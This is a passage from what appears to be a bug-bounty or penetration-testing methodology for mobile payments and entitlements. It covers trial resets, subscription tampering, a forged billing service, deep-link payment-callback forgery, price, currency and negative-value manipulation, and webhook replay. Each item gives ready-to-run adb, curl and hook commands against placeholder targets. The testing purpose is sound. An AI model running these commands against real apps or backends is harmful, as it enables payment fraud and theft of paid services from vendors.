| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); `sensitive_data_exposure\|disclosure_of_secrets\|pay_per_use_abuse` (**P4**) where the trial burns a metered third-party resource |
| **Attacker** | AM-01 |
| **Applies to** | any app with a free trial, a free-credit grant or a usage quota |
| **Maps to** | API6:2023 Unrestricted Access to Sensitive Business Flows; MASWE-0018; Mobile Top 10 2024 M3; MASTG-TEST-0338 (the trial-counter attack scenario) |

- **Test:** The "you already used your trial" guard is usually local state or an install-scoped
  identifier. Clear it three ways and see which one the server re-grants on.
- **How:**
```bash
P=com.target.app
adb shell pm clear $P                                   # local state only
adb uninstall $P && adb install base.apk                # local state + install id
adb shell settings put secure advertising_id $(uuidgen) # ad id rotation
# and straight at the API, same account, no client involved
curl -i -X POST https://api.target/v1/trial/start -H "Authorization: Bearer $T"
curl -i -X POST https://api.target/v1/trial/start -H "Authorization: Bearer $T"    # twice
```
  Record which identifier the trial is keyed on:
```bash
grep -rnE 'ANDROID_ID|Secure\.getString|randomUUID|installationId|FirebaseInstallations|getId\(\)|AdvertisingIdClient' jadx_out/sources -A4
```
- **Proof:** A second (and third) trial active on the **same account identity**, read back from the
  server, with the sequence of clears that produced it.
- **Escalation:** -> D23-014 (one device, many installs) is the version that scales without needing new
  accounts. -> D23-044 if the trial grant is monetary credit.
- **Ruled out when:** `POST /trial/start` on an account that has consumed its trial is refused
  irrespective of every client-side clear, i.e. the entitlement is keyed on the account, not the install.
  Show the refusal after a full uninstall/reinstall.

### D23-014 · Entitlement keyed to the install, so clones, work profiles and Private Space multiply it

| | |
|---|---|
| **Severity ceiling** | High (Medium for a free trial; High when it is monetary referral/credit and scales, or when "one device per licence" is the product) |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-11 physical unlocked, scaling to AM-01 once the identifier generation is understood |
| **Applies to** | Android 5+ for multi-user; **Private Space is Android 15+**; OEM dual-app/clone features are vendor-specific — name the OEM and the feature in the report |
| **Maps to** | MASWE-0057; MASTG-TECH-0008; the multi-user/Private Space impact surface |

- **Test:** If a trial, free credit, referral bonus or device-limited licence is keyed on an install-scoped
  identifier — a generated UUID in prefs, the FCM token, `Settings.Secure.ANDROID_ID`, a Firebase
  installation id — then every instantiation of the app on one physical device mints a fresh entitlement.
- **How:**
```bash
P=com.target.app
adb shell pm create-user clone1                          # note the returned user id, e.g. 10
adb install -r --user 10 base.apk
for U in 0 10; do
  adb shell "run-as $P cat /data/user/$U/$P/shared_prefs/*.xml" | grep -iE 'install|uuid|device|client_id'
done
# plus: OEM dual-app, work profile, and Private Space on Android 15+
```
  Claim the trial or bonus in each instance and read the server's view of both.
- **Proof:** Two active trials, or two credited bonuses, attributable to one physical device — shown side
  by side with the two distinct install identifiers printed from each user's prefs.
- **Escalation:** -> D23-044 (referral farming), and -> D06/D11 if user 10's instance can also reach user
  0's data, which makes it a cross-user access finding as well.
- **Ruled out when:** The second instance is refused the grant because the server keys on the account or
  on a Play-attested device signal. Print both installs' identifiers *and* the refusal — identical
  identifiers across instances would also rule it out, for a different reason worth recording.

### D23-015 · Subscription expiry cached client-side and extended in place

| | |
|---|---|
| **Severity ceiling** | High (when server-accepted); Low otherwise |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-12 to set up, AM-01 to prove |
| **Applies to** | all frameworks; the cross-platform stores are the common case (AsyncStorage, `shared_preferences`, PlayerPrefs, MMKV) |
| **Maps to** | MASWE-0057 (CWE-471); MASTG-TECH-0008; Mobile Top 10 2024 M7 |

- **Test:** Many apps cache the entitlement with an expiry and only re-check on a schedule. Editing the
  cached expiry extends access until the next scheduled check — and sometimes indefinitely, if the check
  trusts the cached value as its own input.
- **How:**
```bash
# React Native
sqlite3 RKStorage.db "select key,value from catalystLocalStorage where key like '%sub%' or key like '%entitle%';"
# Flutter
adb shell "run-as com.target.app cat shared_prefs/FlutterSharedPreferences.xml" | grep -iE 'expiry|premium|tier|until'
# Unity
adb shell "run-as com.target.app cat shared_prefs/com.target.app.v2.playerprefs.xml"
# then edit the timestamp, relaunch, and drive a premium action end to end
```
- **Proof:** A premium **server** action succeeding after the local expiry was pushed forward — and,
  decisively, succeeding again after a forced sync. If it fails at the first sync, it does not go in the
  report.
- **Escalation:** -> D19 for the framework-specific store, -> D23-005.
- **Ruled out when:** The next entitlement sync overwrites the edited expiry with the server's value and
  the premium action fails. Capture the sync response carrying the authoritative expiry.

### D23-016 · Cancellation, grace period and pause/resume abuse

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | all subscription apps |
| **Maps to** | WSTG-BUSL-06 Circumvention of Work Flows; API6:2023; MASWE-0018 |

- **Test:** The lifecycle states — active, cancelled, in grace, on hold, paused, expired — are a state
  machine that is rarely tested against out-of-order transitions. Attack each edge.
- **How:**
```bash
curl -i -X POST https://api.target/v1/subscription/cancel -H "Authorization: Bearer $T"
curl -s  https://api.target/v1/entitlements -H "Authorization: Bearer $T" | jq '.active,.expiresAt,.state'
curl -i -X POST https://api.target/v1/subscription/pause  -H "Authorization: Bearer $T" -d '{"days":365}'
curl -i -X POST https://api.target/v1/subscription/resume -H "Authorization: Bearer $T"
curl -i -X PUT  https://api.target/v1/subscription        -H "Authorization: Bearer $T" -d '{"state":"ACTIVE","expiresAt":"2099-01-01T00:00:00Z"}'
# the interesting race: cancel against renewal
```
  For the race, put the cancel and the renewal-verification request in one parallel group (Burp
  single-packet) and read the resulting state.
- **Proof:** `entitlements` returning `active:true` after cancellation **and past the period end**, or a
  pause that extends paid access rather than suspending it, read back from a clean session.
- **Escalation:** -> D23-045 races; -> D23-012 if cancellation also issues credit.
- **Ruled out when:** Each transition is refused unless it is legal from the current state, and the
  post-period read shows `active:false`. Run the whole state table and record the matrix — that matrix is
  the ruled-out entry.

### D23-017 · Entitlement state driven by a broadcast, a `PendingIntent` or a deep link

| | |
|---|---|
| **Severity ceiling** | High if the server honours it; Medium when it only unlocks locally-present paid assets |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927) — the one Android-native node rated on what it exposes |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | **targetSdk < 31**: components with intent-filters are exported by default. **Android 14 (targetSdk 34+)** mandates `RECEIVER_EXPORTED`/`RECEIVER_NOT_EXPORTED` on runtime registration — check registration sites as well as the manifest |
| **Maps to** | MASVS-PLATFORM; `risks/insecure-broadcast-receiver`; `risks/access-control-to-exported-components`; CWE-927 |

- **Test:** Entitlement refresh is frequently plumbed through a broadcast or a callback `PendingIntent`.
  Each of those is an injectable channel, and the grant path behind it was written assuming only the
  billing library could reach it.
- **How:**
```bash
grep -rn -i 'premium\|entitlement\|subscription\|purchase\|isPro\|billing\|license' jadx_out/sources \
  | grep -iE 'receiver|onReceive|registerReceiver|PendingIntent|IntentFilter'
grep -n -B4 -A12 '<receiver' out/AndroidManifest.xml | grep -iE 'billing|purchase|licen[sc]e|entitle|premium'
adb shell am broadcast -a com.target.app.PURCHASE_UPDATED --ez premium true --es sku pro_yearly
adb shell am start -a android.intent.action.VIEW -d "targetapp://unlock?tier=premium" com.target.app
```
- **Proof:** Paid UI rendered after a shell-originated broadcast **and** the backend's answer to the next
  entitlement call. State clearly which of the two you got: server acceptance is High, local-only is
  Medium and its real value is that it usually reveals paid content shipped inside the APK.
- **Escalation:** -> D05 (receivers), -> D08 (`PendingIntent`), -> D23-005 for the server half.
- **Ruled out when:** The receiver is `android:exported="false"` (or registered with
  `RECEIVER_NOT_EXPORTED`) **and** `am broadcast` from the shell is refused with a
  `SecurityException`/no delivery — not merely because the manifest says so. `adb shell am` runs as
  `shell`, which is more privileged than a third-party app: confirm the negative from a test app with no
  permissions before writing it down.

### D23-018 · Entitlement row writable through an exported `ContentProvider`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927) |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | **targetSdk < 17**: providers are exported by default — state this explicitly if it applies. Otherwise any provider with `android:exported="true"` or a `grantUriPermissions` path |
| **Maps to** | CWE-927; `risks/content-resolver`; MASWE-0057 |

- **Test:** Where the entitlement lives in a database fronted by a provider, the flip does not need root
  at all — any installed app performs it.
- **How:**
```bash
grep -n -B2 -A12 '<provider' out/AndroidManifest.xml
adb shell content query  --uri content://com.target.app.provider/entitlements
adb shell content update --uri content://com.target.app.provider/entitlements \
  --bind tier:s:premium --bind active:i:1 --where "1=1"
adb shell content insert --uri content://com.target.app.provider/entitlements \
  --bind sku:s:premium_lifetime --bind active:i:1
```
  Then repeat from an unprivileged test app rather than from `adb shell`, because `shell` holds
  privileges a third-party app does not.
- **Proof:** The row changed from a zero-permission app, the paid feature active, and the server's
  response to the next entitlement call. Include the attacker app's manifest showing an empty
  `<uses-permission>` set.
- **Escalation:** -> D07 (provider surface generally), -> D23-005.
- **Ruled out when:** The provider is not exported and the URI is unreachable from an unprivileged app
  (`SecurityException: Permission Denial` in `logcat` from the *test app*, not from `adb shell`), or the
  provider enforces a signature-level permission — quote the permission's `protectionLevel`.

### D23-019 · Implicit bind to `InAppBillingService.BIND` — the billing-proxy app

| | |
|---|---|
| **Severity ceiling** | Critical (High for revenue loss; Critical if the forged entitlement unlocks other users' content) |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927); `broken_access_control\|privilege_escalation` (**VARIES**) for the consequence |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | apps still shipping the legacy `IabHelper`/direct-bind path — **LEGACY**; the modern Play Billing Library binds explicitly, so verify which one is in the APK before writing anything. **targetSdk < 30** also grants free package visibility, which makes the malicious service easier to place |
| **Maps to** | Google ASI campaign *Google Play Billing interception* (started 2016-07-28, `faqs/answer/7054270`) — the stated remediation is literally `Intent.setPackage("com.android.vending")`; CWE-927 |

- **Test:** Binding the billing service with an implicit intent lets any installed app answer instead of
  Play and return a forged `getPurchases`/`getSkuDetails` result — Google's own words are that this lets
  an attacker "bypass the Play store billing system and access items that have not been purchased".
- **How:**
```bash
grep -rn 'InAppBillingService.BIND\|com.android.vending.billing' jadx_out/sources -B8 -A6
grep -rn 'IabHelper\|bindService(' jadx_out/sources | head
grep -rn 'setPackage("com.android.vending")\|setComponent(' jadx_out/sources      # the fix, if present
```
  Attacker service, in a package with no permissions:
```xml
<service android:name=".FakeBilling" android:exported="true">
  <intent-filter android:priority="999">
    <action android:name="com.android.vending.billing.InAppBillingService.BIND"/>
  </intent-filter>
</service>
```
- **Proof:** `onBind` firing in your service (log it with the caller's UID from `Binder.getCallingUid()`),
  your forged `getPurchases` bundle returned, and the target app granting the entitlement — plus the
  backend's answer to the next entitlement call.
- **Escalation:** -> D06 (implicit service binds generally), -> D23-005.
- **Ruled out when:** The bind is explicit — `setPackage("com.android.vending")` or an explicit
  `ComponentName` at the call site — or the app uses the Play Billing Library, whose bind is explicit.
  Confirm dynamically: install the decoy service and show that `onBind` never fires during a purchase.

### D23-020 · Play Integrity `appLicensingVerdict` unused, or evaluated on the client

| | |
|---|---|
| **Severity ceiling** | Medium (Support when the app has no licensing claim to make) |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | apps that claim Play-install enforcement or paid-app licensing |
| **Maps to** | Play Integrity verdicts — `accountDetails.appLicensingVerdict` ∈ {`LICENSED`, `UNLICENSED`, `UNEVALUATED`}, where `LICENSED` means "User installed/updated app from Google Play"; the Integrity overview's rule that all decisions are made server-side; MASVS-RESILIENCE-3 |

- **Test:** Where the app uses the licensing verdict at all, check that it is read from a **server-decoded
  token** rather than from a locally-decoded one, and that `UNEVALUATED` is treated as a failure rather
  than a pass.
- **How:**
```bash
grep -rnE 'IntegrityManager|StandardIntegrityManager|requestIntegrityToken|appLicensingVerdict|
LICENSED|UNLICENSED|UNEVALUATED|decodeIntegrityToken|PiracyChecker|LicenseChecker|LicenseValidator' jadx_out/sources -A8
```
  If the verdict string appears anywhere in client code paths that gate features, the decision is local.
  Then check the fail-open branch: force `requestIntegrityToken` to throw and see whether the gate opens.
- **Proof:** The client-side comparison quoted at `file:line`, plus the feature available after the token
  request is made to fail (drop it at the proxy, or hook the listener's error path).
- **Escalation:** -> D21 (attestation integration generally: freshness, `requestHash` binding, replay).
  This item is only the payments-shaped slice of it.
- **Ruled out when:** The raw integrity token is forwarded to the vendor's backend and the entitlement
  decision arrives in the response — confirm by dropping the token from the request and observing the
  entitlement refused, rather than by reading the code.

### D23-021 · Client-computed price, total or credit posted to the server

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|idor\|modify_sensitive_information_iterable_object_identifiers` (**P2**) for the modification class; argue **P1** where the modified order settles and goods ship |
| **Attacker** | AM-01 |
| **Applies to** | all commerce apps; cross-platform builds are over-represented because the shared business logic runs on-device |
| **Maps to** | **T1641.001** Transmitted Data Manipulation; API3:2023; WSTG-BUSL-03 Test Integrity Checks; Mobile Top 10 2024 M7 |

- **Test:** Find every money field the client *names* in a request and change it. The enabling condition
  is that the client sends it; the bug is that the server honours it.
- **How:**
```bash
S=jadx_out/sources
grep -rnoE '"(amount|total|price|unitPrice|subtotal|grandTotal|finalCustomerAmount|finalPrice|creditsToDeduct|
discount|couponValue|walletAmount|payable|fee|shipping)"' $S | sort | uniq -c | sort -rn
# cross-platform bundles carry the same names in plaintext:
grep -a -nE '"(amount|price|total|discount|couponValue|finalPrice)"' hbc.strings out_dir/pp.txt | head -40
# then the single most persuasive PoC: edit the request, no instrumentation
curl -s -X POST https://api.target/v1/checkout -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"items":[{"id":"SKU-EXPENSIVE","qty":1}],"total":0.01,"currency":"USD"}' -i
curl -s https://api.target/v1/orders/$ORDER -H "Authorization: Bearer $T" | jq '.total,.status,.items'
```
- **Proof:** The **order record fetched back from the server** showing the attacker-chosen amount and the
  expensive item, plus the payment captured at that amount. A 200 on the create call is not proof; the
  order read-back is.
- **Escalation:** -> D23-022 (negative values), -> D23-023 (currency), -> D23-024 (cart TOCTOU), -> D15
  mass assignment (the same effect through `price_override`, `discount_pct`, `loyalty_applied`).
- **Ruled out when:** The server recomputes and the order read-back shows the catalogue price regardless
  of what you sent, **and** the payment capture matches that recomputed figure. Test at least three
  fields — servers commonly re-derive `total` while trusting `discount`.

### D23-022 · Negative quantity, negative price and numeric-boundary values — carried to settlement

| | |
|---|---|
| **Severity ceiling** | Critical when the credit settles into a withdrawable balance; Informational if checkout errors at payment |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); **P1** argued when the credit becomes withdrawable money |
| **Attacker** | AM-01 |
| **Applies to** | commerce and wallet backends |
| **Maps to** | T1641 Data Manipulation; API3:2023; WSTG-BUSL-03 |

- **Test:** Cart endpoints validate "is it a number" and nothing else. The false-positive trap is
  explicit and it is the reason most of these reports get closed: **many cart APIs accept arbitrary client
  state while the payment-capture step rejects negative totals. "Negative price accepted in the cart" is
  not a bug — the cart display is fiction.** Carry it to settlement or do not file it.
- **How:**
```bash
curl -s -X POST https://api.target/v1/cart/items -H "Authorization: Bearer $T" \
  -d '{"product_id":42,"quantity":-3}' -i
curl -s -X POST https://api.target/v1/cart/items -H "Authorization: Bearer $T" \
  -d '{"product_id":42,"quantity":1,"price_override":-100}' -i
for A in -500 0 0.001 0.0001 999999999999 1e308 "1e1" "0x10" " 100" "100 " "1,00"; do
  curl -s -o /dev/null -w "$A -> %{http_code}\n" -X POST https://api.target/v1/orders/$O/tip \
    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"amount\":$A}"
done
# then CARRY IT: complete the checkout and read the ledger
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
```
- **Proof:** A ledger entry that moved the wrong way — wallet balance, store credit, or a refund issued to
  your payment instrument — with the before and after balance reads and the exact request that caused it.
- **Escalation:** -> D23-048 (withdraw the credit, which is what makes it Critical rather than
  interesting), -> D23-025 (free-amount fields).
- **Ruled out when:** The negative value is rejected at the cart **or** accepted at the cart and rejected
  at capture with the balance unchanged. Record both balance reads — "the cart accepted it" is not a
  negative either; you must show the money did not move.

### D23-023 · Currency swap mid-checkout

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|idor\|modify_sensitive_information_iterable_object_identifiers` (**P2**), argued up on the settled delta |
| **Attacker** | AM-01 |
| **Applies to** | multi-currency checkouts and multi-currency wallets |
| **Maps to** | T1641.001; API3:2023; WSTG-BUSL-03 |

- **Test:** The server stores the price in one currency but accepts a client-supplied `currency`
  parameter. Send the same numeric value with a weaker currency code and the charge collapses.
- **How:**
```bash
# add a $100 USD product, then at checkout keep the VALUE and change the CODE
curl -s -X POST https://api.target/v1/checkout -H "Authorization: Bearer $T" \
  -d '{"order_id":"'$O'","amount":100,"currency":"VND"}' -i
# the wallet variant: charged in a weak currency, credited in a strong one
curl -s -X POST https://api.target/v1/wallet/topup -H "Authorization: Bearer $T" \
  -d '{"amount":100,"currency":"VND"}' -i
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
# and the minor-unit variant: send 100 where the API expects cents, or vice versa
curl -s -X POST https://api.target/v1/checkout -H "Authorization: Bearer $T" \
  -d '{"order_id":"'$O'","amount":1,"currency":"USD","amount_minor":false}' -i
```
- **Proof:** The payment provider charging the low-currency amount while the order fulfils goods worth the
  original value — the PSP receipt (your own test transaction) beside the order record.
- **Escalation:** Currency substitution frequently also bypasses per-transaction limits that are expressed
  in the base currency — test D23-026 immediately afterwards with the swapped code.
- **Ruled out when:** The server rejects a currency that does not match the order's, or recomputes the
  amount from its own FX table and the captured figure equals the catalogue price. Show the capture, not
  the checkout response.

### D23-024 · Cart-state TOCTOU: total priced at step 1, cart mutated at step 2, captured at step 3

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | multi-step checkouts — the norm in mobile, where the payment sheet is a separate screen from the cart |
| **Maps to** | WSTG-BUSL-03; API6:2023 |

- **Test:** Begin with a cheap cart, capture the priced total from step 1, add expensive items, then
  submit the payment capture that references the step-1 total or its quote/intent id.
- **How:**
```bash
Q=$(curl -s -X POST https://api.target/v1/checkout/quote -H "Authorization: Bearer $T" \
      -d '{"cart_id":"'$C'"}' | jq -r '.quote_id,.total')
curl -s -X POST https://api.target/v1/cart/items -H "Authorization: Bearer $T" \
  -d '{"product_id":"SKU-EXPENSIVE","quantity":1}' -i
curl -s -X POST https://api.target/v1/checkout/capture -H "Authorization: Bearer $T" \
  -d '{"quote_id":"'$Q'"}' -i
curl -s https://api.target/v1/orders/$O | jq '.total,.items'
```
- **Proof:** The order containing the expensive item at the cheap captured total, with the three requests
  in timestamp order.
- **Escalation:** -> D23-027 (the same defect through step-skip), -> D23-045 (mutate the cart *during*
  capture with a parallel pair rather than sequentially).
- **Ruled out when:** The capture re-prices and either rejects the stale quote (`quote expired` /
  `cart changed`) or charges the recomputed total. Show the order read-back matching the recomputed
  figure.

### D23-025 · Free-amount fields: tip, donation, round-up, custom top-up

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | any app with tipping, donations, round-up, wallet top-up or a custom-amount payment |
| **Maps to** | T1641; API3:2023; WSTG-BUSL-03 |

- **Test:** Free-amount inputs get materially less validation than the cart because there is no catalogue
  price to compare against. They are the softest money field in most apps.
- **How:** Run the numeric battery from D23-022 against every free-amount endpoint, then the currency
  battery from D23-023 against the same endpoint, then read the ledger:
```bash
for A in -500 -0.01 0 0.001 999999999999 1e308; do
  curl -s -o /dev/null -w "$A -> %{http_code}\n" -X POST https://api.target/v1/orders/$O/tip \
    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"amount\":$A}"
done
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
```
- **Proof:** A balance or ledger entry that moved the wrong way or by the wrong magnitude, with the
  before/after reads.
- **Escalation:** -> D23-048 if the credit is withdrawable.
- **Ruled out when:** Every out-of-range value is refused with a field-scoped validation error and a valid
  amount in the same window succeeds — that positive control is what makes the negative credible.

### D23-026 · Limits, thresholds and risk rules that live only in the client

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | fintech, gaming, marketplace and ticketing apps |
| **Maps to** | **MASTG-TEST-0368**; MASWE-0059 (CWE-693); MASVS-RESILIENCE-3; API6:2023 Unrestricted Access to Sensitive Business Flows; Mobile Top 10 2024 M7 |

- **Test:** Two findings in one sweep. First, whether min/max/daily/monthly limits are enforced anywhere
  but the UI. Second — the more valuable half — whether the **fraud scoring rules** are recoverable from
  the decompile or from a backend-pushed config, so transactions can be crafted to sit just under them.
- **How:**
```bash
S=jadx_out/sources
grep -rnE 'MAX_|MIN_|LIMIT|maxAmount|minAmount|dailyLimit|monthlyLimit|perTxnLimit|trialDays|discountPct' $S -B4 -A4 | head -60
grep -rniE 'threshold|risk_?score|velocity|max_?amount|daily_?limit|attempt|suspicious|allowlist|whitelist|blocklist' $S | head -40
grep -rnE '\b(10000|5000|2000|1000|500|100)\b' $S | grep -iE 'amount|limit|max|threshold' | head -20
# the pushed-config variant is the durable one
mitmdump -nr traffic.flows -s /dev/stdin <<'PY'
def response(f):
    b=(f.response.content or b'').lower()
    if any(k in b for k in (b'threshold', b'risk', b'limit', b'velocity', b'score')):
        print(f.request.pretty_host, f.request.path[:80])
PY
# then send a value outside the client's allowed range
curl -i -X POST https://api.target/v1/wallet/withdraw -H "Authorization: Bearer $T" -d '{"amount":999999}'
```
- **Proof:** For the limit: a 200 and a settled transaction above the documented limit, with the client's
  own constant quoted at `file:line`. For the rules: the numeric rule quoted from the client or the
  config response, plus a transaction you completed deliberately just under it that was not flagged.
- **Escalation:** A backend-pushed rule set is the stronger variant — the rules are visible to every
  client and change without an app update, so one capture gives durable knowledge. -> D18 for the config
  channel.
- **Ruled out when:** The out-of-range request is refused server-side with the same limit the client
  enforces, and the limit value does not appear in any client-reachable config. Record the refusal and the
  absence.

### D23-027 · Step-skip and state-machine reversal in the order flow

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); **P1** argued where goods ship with no payment captured |
| **Attacker** | AM-01 |
| **Applies to** | payments and commerce backends with a multi-endpoint order flow |
| **Maps to** | WSTG-BUSL-06 Circumvention of Work Flows; API6:2023; disclosed precedents: double payout via mishandled payment-provider transaction states — withdrawing money without the funds being deducted (H1 #307239, $10,000); modifying in-flight data to a payment provider to generate wallet balance (H1 #1295844, $7,500) |

- **Test:** `cart -> payment -> fulfilment`, each at a separate endpoint. The state machine enforces the
  happy path but not each transition independently. This is the lowest-duplicate class in the chapter
  because no scanner reaches it.
- **How:** Place one normal order and capture every request in the flow. Then, on a new order:
```bash
# 1. skip straight to fulfilment
curl -i -X POST https://api.target/v1/orders/$NEW/fulfill -H "Authorization: Bearer $T"
# 2. set the status directly
curl -i -X PUT  https://api.target/v1/orders/$NEW -H "Authorization: Bearer $T" -d '{"status":"paid"}'
# 3. replay a previous successful payment callback against the new order id
curl -i -X POST https://api.target/v1/payments/callback -H 'Content-Type: application/json' \
  -d "$(sed "s/$OLD/$NEW/" old_callback.json)"
# 4. hit the post-payment redirect with a forged success
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://payment/return?status=success&orderId=$NEW&code=00"
# transition matrix worth walking in full:
#   pending -> shipped (skipping paid) | paid -> refunded while goods delivered | cancelled -> fulfilled
```
- **Proof:** The order shipped or the digital good delivered with no payment captured — the order record
  and the PSP's own view of the (absent) charge, side by side.
- **Escalation:** -> D23-028 (callback forgery specifically), -> D23-030 (webhook replay), -> D23-045
  (`paid -> refunded` raced against fulfilment).
- **Ruled out when:** Every later step rejects an order that has not reached the prerequisite state, with
  a state-specific error, and the PUT-status route either does not exist or ignores the field. Walk the
  whole transition matrix and record it — a partial walk is not a negative.

### D23-028 · Payment callback / return-URL forged through a deep link

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927) for the local trigger; `broken_authentication_and_session_management\|authentication_bypass` (**P1**) where the forged return completes a payment that never happened |
| **Attacker** | AM-02 remote one click (a web page can fire the scheme); AM-03 locally |
| **Applies to** | every app that hands off to a PSP app, a bank app or a browser and returns via a deep link or `onActivityResult` |
| **Maps to** | CWE-927; `risks/unsafe-use-of-deeplinks`; CVE-2025-12080 (intent injection reaching a billable action); WSTG-BUSL-02 |

- **Test:** After the hand-off, the app learns the outcome from a return URI or an activity result. If it
  believes the parameters in that return rather than asking its own backend, a link forges the payment.
- **How:**
```bash
grep -rnE 'onActivityResult|RESULT_OK|paymentStatus|txnStatus|verifySignature|checksum|
returnUrl|callbackUrl|redirectUrl|shouldOverrideUrlLoading|handleRedirect' jadx_out/sources | grep -iE 'pay|txn|order|checkout'
grep -n -A12 '<data android:scheme' out/AndroidManifest.xml | grep -iE 'pay|callback|return|checkout'
# forge it
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://payment/callback?status=success&orderId=$REAL_ORDER&txnId=X&signature=x"
# and via a web page, which is the attacker-realistic version
printf '<script>location="targetapp://payment/callback?status=success&orderId=%s"</script>' "$REAL_ORDER" > poc.html
```
- **Proof:** The order marked paid and the goods/entitlement released, with the PSP showing no charge.
  Screenshot the order state before and after, and include the PSP view.
- **Escalation:** -> D09 (deep-link surface generally), -> D23-027. The web-page variant upgrades the
  attacker model from AM-03 to AM-02 and is worth ten minutes.
- **Ruled out when:** The app ignores the return parameters and re-queries its backend, which re-queries
  the PSP — demonstrated by firing the forged callback and observing the order stay `pending` plus the
  server-side status call in the proxy. A signature on the callback that the *client* validates is not a
  ruling-out; check that the **server** validates it.

### D23-029 · PSP SDK local "payment succeeded" callback treated as authoritative

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | Stripe, Braintree, Adyen, Razorpay, PayU, Checkout.com, Cashfree, Juspay and similar drop-in SDKs |
| **Maps to** | API3:2023; WSTG-BUSL-02; MASWE-0018 |

- **Test:** The SDK hands the client a success object. The correct design waits for the server-confirmed
  webhook. Test whether the order completes on a client-asserted success with no matching PSP charge.
- **How:**
```bash
grep -rnE 'onPaymentSuccess|onPaymentError|confirmPayment|handleNextAction|PaymentIntentResult|
setPaid|markOrderPaid|onActivityResult.*[Pp]ay|PaymentResultListener' jadx_out/sources -A8
curl -s -X POST https://api.target/v1/orders/$O/confirm -H "Authorization: Bearer $T" \
  -d '{"payment_intent":"pi_fake_123","status":"succeeded"}' -i
curl -s https://api.target/v1/orders/$O -H "Authorization: Bearer $T" | jq '.status,.paid,.total'
```
  For a framework build, forge the resolve value at the bridge instead:
```javascript
// Unity / IL2CPP
Il2Cpp.perform(() => {
  const k = Il2Cpp.domain.assembly("Assembly-CSharp").image.class("IAPManager");
  k.method("OnPurchaseComplete").implementation = function (p) { console.log("purchase", p); return this.method("OnPurchaseComplete").invoke(p); };
});
```
- **Proof:** The order transitioning to paid/fulfilled on a client-asserted success with **no matching
  charge in the PSP dashboard** — include your own test-mode PSP view.
- **Escalation:** -> D23-030 (if the webhook exists but is replayable, the vendor has the right design and
  the wrong implementation), -> D19 for the framework bridge.
- **Ruled out when:** The confirm endpoint rejects an unknown payment intent and the order only moves to
  paid when the PSP webhook lands. Show the fake-intent refusal beside the real webhook-driven transition.

### D23-030 · Payment webhook replay — signature-verified but not idempotent

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration\|race_condition` (**VARIES**) for the concurrent form; `broken_access_control\|privilege_escalation` (**VARIES**) for the sequential form |
| **Attacker** | AM-01 if the webhook endpoint is reachable and the body replayable; AM-09 malicious backend/CDN in the hostile-PSP framing |
| **Applies to** | any webhook consumer — the norm in mobile payment backends |
| **Maps to** | MASWE-0009 (missing replay protection); WSTG-BUSL-02; API6:2023 |

- **Test:** The backend verifies the PSP signature and never records whether it has already processed that
  event id. The signature stays valid on redelivery, so the second delivery credits again.
- **How:** Capture a genuine "payment received" callback for your own test transaction (from the PSP's
  own delivery log, or from the proxy where the app relays it), then re-deliver it verbatim:
```bash
curl -i -X POST https://api.target/webhooks/psp \
  -H "Content-Type: application/json" -H "PSP-Signature: $SIG_FROM_ORIGINAL" \
  --data-binary @payment_received.json
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
# adjacent probe: idempotency keys
curl -i -X POST https://api.target/v1/transfers -H "Authorization: Bearer $T" \
  -H 'Idempotency-Key: K1' -d '{"to":"me","amount":10}'
curl -i -X POST https://api.target/v1/transfers -H "Authorization: Bearer $T" \
  -H 'Idempotency-Key: K1' -d '{"to":"me","amount":10000}'     # same key, different body
```
- **Proof:** The order credited twice, the refund processed twice, or the metered usage doubled — read
  from the ledger, with both deliveries' timestamps. For the idempotency probe, the second (different)
  body being processed under a reused key is itself the finding.
- **Escalation:** -> D23-045 (deliver N copies in parallel rather than sequentially), -> D23-047.
- **Ruled out when:** The redelivery returns an "already processed" acknowledgement and the ledger is
  unchanged; the reused idempotency key with a different body is rejected outright. Record both ledger
  reads.

### D23-031 · Saved payment instrument reusable across accounts or on a new device

| | |
